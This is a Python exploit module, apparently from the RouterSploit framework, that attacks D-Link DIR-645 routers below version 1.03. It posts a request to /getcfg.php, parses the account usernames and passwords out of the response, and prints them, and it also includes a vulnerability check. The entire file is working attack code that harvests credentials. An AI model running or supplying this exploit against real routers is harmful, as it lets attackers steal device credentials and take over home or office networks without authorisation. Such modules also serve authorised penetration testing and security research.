import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-645 Password Disclosure",
        "description": "Module exploits D-Link DIR-645 password disclosure vulnerability.",
        "authors": (
            "Roberto Paleari <roberto[at]greyhats.it>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt",
        ),
        "devices": (
            "D-Link DIR-645 (Versions < 1.03)",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        # address and parameters
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        # connection
        response = self.http_request(
            method="POST",
            path="/getcfg.php",
            data=data
        )
        if response is None:
            return

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub(r'\s+', '', response.text))

        # displaying results
        if len(creds):
            print_success("Credentials found!")
            headers = ('Username', 'Password')
            creds = tuple(tuple([item[0], item[2]]) for item in creds)
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        # address and parameters
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        response = self.http_request(
            method="POST",
            path="/getcfg.php",
            data=data
        )
        if response is None:
            return False  # target is not vulnerable

        # extracting credentials
        regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
        creds = re.findall(regular, re.sub(r'\s+', '', response.text))

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
